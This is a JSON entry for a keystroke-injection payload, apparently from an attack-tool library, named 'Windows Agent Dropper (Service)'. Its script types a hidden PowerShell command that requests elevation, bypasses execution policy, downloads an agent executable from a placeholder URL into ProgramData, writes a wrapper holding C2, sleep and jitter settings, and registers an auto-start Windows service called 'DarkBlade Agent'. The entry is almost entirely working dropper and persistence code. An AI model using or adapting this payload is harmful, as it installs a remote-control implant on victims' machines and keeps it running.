{
  "name": "Windows Agent Dropper (Service)",
  "category": "Persistence",
  "os": "Windows",
  "description": "Elevates (UAC), downloads agent to ProgramData, writes wrapper, creates AutoStart service that runs the wrapper via cmd.exe.",
  "script": "REM Windows Agent Dropper - Service (requires UAC accept)\nGUI r\nDELAY 400\nSTRING powershell -w hidden -nop -c \"$ErrorActionPreference='SilentlyContinue';$a='Start-Process powershell -Verb runAs -WindowStyle Hidden -ArgumentList ''-NoProfile -ExecutionPolicy Bypass -Command \''' + \"$u='${AGENT_URL}';$d=$env:ProgramData+'\\DB';New-Item -Force -ItemType Directory -Path $d|Out-Null;$p=$d+'\\db-agent.exe';try{iwr $u -UseBasicParsing -OutFile $p}catch{};$w=$d+'\\run-agent.cmd';$c=\"@echo off`r`nset DB_C2=${C2_URL}`r`nset DB_SLEEP=${SLEEP:=60}`r`nset DB_JITTER=${JITTER:=30}`r`nset DB_PROXY=${PROXY}`r`n\"+\"\"\"%~dp0db-agent.exe\"\"\";Set-Content -LiteralPath $w -Value $c -Encoding ASCII; sc.exe create DBAgent binPath= \"cmd.exe /c \"\"\"" + $w + "\"\"\"\" start= auto DisplayName= \"DarkBlade Agent\"; sc.exe description DBAgent \"DarkBlade Agent\"; sc.exe start DBAgent\"\"'\''\";Invoke-Expression $a\"\nENTER\n"
}